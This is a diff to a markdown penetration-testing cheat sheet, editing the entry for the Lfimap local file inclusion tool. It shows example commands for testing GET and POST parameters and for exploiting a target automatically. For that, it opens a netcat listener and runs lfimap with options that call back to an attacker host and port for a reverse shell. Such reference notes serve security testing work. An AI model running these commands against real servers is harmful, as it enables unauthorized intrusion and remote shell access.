@@ -121,15 +121,15 @@ If environ file can be included User-Agent string can be used in order to achiev
 ### Lfimap
 
 [Lfimap](https://github.com/hansmach1ne/lfimap), local file inclusion discovery and exploitation tool.  
-Automatically tests filter, data, input, expect and file wrappers, path truncation, remote file inclusion, xss and command injection.
+Automatically tests lfi WITH filter, data, input, expect and file wrappers and path truncation.
 
 Test GET parameters  
-`sudo python3 lfimap.py "http://server/index.php?page=PWN" -a`  
+`sudo python3 lfimap.py "http://server/index.php?page=PWN"`  
 
 Test POST parameters   
-`sudo python3 lfimap.py "http://server/index.php" -D "page=PWN" -a`  
+`sudo python3 lfimap.py "http://server/index.php" -D "page=PWN"`  
 
 
 Exploit vulnerable target automatically    
 `sudo rlwrap nc -nvlp 99`  
-`sudo python3 lfimap.py "http://server/index.php?page=PWN" -a -x --lhost <ip> --lport 99`
+`sudo python3 lfimap.py "http://server/index.php?page=PWN" -x --lhost <ip> --lport 99`
